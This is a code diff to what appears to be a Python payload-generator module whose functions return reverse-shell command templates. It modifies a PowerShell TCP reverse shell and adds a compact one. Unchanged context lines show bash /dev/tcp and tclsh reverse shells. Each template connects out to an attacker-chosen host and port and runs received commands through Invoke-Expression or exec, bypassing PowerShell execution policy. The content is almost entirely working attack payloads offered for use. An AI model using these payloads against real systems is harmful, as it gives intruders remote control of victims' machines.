@@ -27,7 +27,7 @@ def BASH_TCP():
 	return """/bin/bash -i >& /dev/tcp/TARGET/PORT 0>&1"""
 
 def REV_POWERSHELL_TCP():
-	return """powershell -nop -ep bypass -Command '$ip=\\"TARGET\\";$port=PORT;$client = New-Object System.Net.Sockets.TCPClient($ip, $port);$stream=$client.GetStream();[byte[]]$bytes = 0..65535|%{0};$sendbytes = ([text.encoding]::ASCII).GetBytes(\\"Windows PowerShell running as user \\" + $env:username + \\" on \\" + $env:computername + \\"`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n\\");$stream.Write($sendbytes,0,$sendbytes.Length);$sendbytes = ([text.encoding]::ASCII).GetBytes(\\"PS \\" + (Get-Location).Path + \\"> \\");$stream.Write($sendbytes,0,$sendbytes.Length);while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) { $returndata = ([text.encoding]::ASCII).GetString($bytes, 0, $i); try { $result = (Invoke-Expression -command $returndata 2>&1 | Out-String ) } catch { Write-Warning \\"Something went wrong with execution of command on the target.\\"; Write-Error $_; }; $sendback = $result +  \\"PS \\" + (Get-Location).Path + \\"> \\"; $x = ($error[0] | Out-String); $error.clear(); $sendback = $sendback + $x; $sendbytes = ([text.encoding]::ASCII).GetBytes($sendback); $stream.Write($sendbytes, 0, $sendbytes.Length); $stream.Flush();}; $client.Close(); if ($listener) { $listener.Stop(); };'"""
+	return """powershell.exe -nop -ep bypass -Command "$ip='TARGET';$port=PORT;$client = New-Object System.Net.Sockets.TCPClient($ip, $port);$stream=$client.GetStream();[byte[]]$bytes = 0..65535|%{0};$sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '> ');$stream.Write($sendbytes,0,$sendbytes.Length);while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) { $returndata = ([text.encoding]::ASCII).GetString($bytes, 0, $i); try { $result = (Invoke-Expression -c $returndata 2>&1 | Out-String ) } catch { Write-Warning 'Something went wrong with execution of command on the target.'; Write-Error $_; }; $sendback = $result +  'PS ' + (Get-Location).Path + '> '; $x = ($error[0] | Out-String); $error.clear(); $sendback = $sendback + $x; $sendbytes = ([text.encoding]::ASCII).GetBytes($sendback); $stream.Write($sendbytes, 0, $sendbytes.Length); $stream.Flush();}; $client.Close(); if ($listener) { $listener.Stop(); };" """
 
 def REVERSE_TCLSH():
 	return """echo 'set s [socket TARGET PORT];while 42 { puts -nonewline $s "shell>";flush $s;gets $s c;set e "exec $c";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | tclsh"""
@@ -68,3 +68,6 @@ def REVERSE_WINDOWS_NCAT_TCP():
 
 def REVERSE_WINDOWS_BLOODSEEKER_TCP():
 	return """ Custom Shell requires a Custom code. """
+
+def REVERSE_POWERSHELL_TINY_TCP():
+	return """powershell.exe -nop -ep bypass -Command "$c=new-object system.net.sockets.tcpclient('TARGET',PORT);$s=$c.GetStream();[byte[]]$b = 0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$o=(iex $d 2>&1|out-string);$z=$o + 'PS' + (pwd).Path + '>';$x = ([text.encoding]::ASCII).GetBytes($z);$s.Write($x,0,$x.Length);$s.Flush};$c.close()" """
